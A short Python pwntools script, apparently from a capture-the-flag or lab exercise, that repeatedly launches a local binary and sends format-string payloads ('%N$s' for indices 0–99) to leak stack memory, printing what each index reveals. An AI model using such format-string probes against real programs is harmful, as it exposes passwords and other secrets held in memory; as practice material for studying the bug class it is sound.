from pwn import *
from time import sleep

context(log_level='error')

for i in range(100):

    sh = process('../build/a.out')

    sh.readuntil(b'\x00')
    sh.sendline(b'%%%d$s' %i)
    sh.sendline(b"deadpass")
    try:
        sh.readuntil(b'\x00')
        print(f"Index {i}: {sh.recv()}")
    except Exception:
        print(f"Index {i}: nil")
    sleep(0.2)
